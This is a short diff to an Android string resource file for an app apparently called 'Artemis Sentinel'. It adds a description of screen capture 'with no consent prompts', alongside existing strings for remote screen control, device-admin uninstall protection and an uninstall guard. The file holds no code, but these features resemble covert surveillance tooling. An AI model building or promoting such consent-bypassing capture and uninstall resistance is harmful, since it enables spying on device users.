@@ -6,6 +6,7 @@
     <string name="channel_name">Artemis Sentinel Service</string>
     <string name="channel_description">Artemis server status notifications</string>
     <string name="accessibility_service_desc">Allows remote control of the device screen</string>
+    <string name="accessibility_service_description">Allows Artemis to capture the screen on demand with no consent prompts — one-time enable, fully automatic afterwards.</string>
     <string name="admin_label">Artemis Sentinel Admin</string>
     <string name="admin_description">Uninstall protection and remote lock for Artemis Sentinel. While active, the app cannot be uninstalled until device admin is deactivated.</string>
     <string name="notification_guard_label">Uninstall Alert Guard</string>
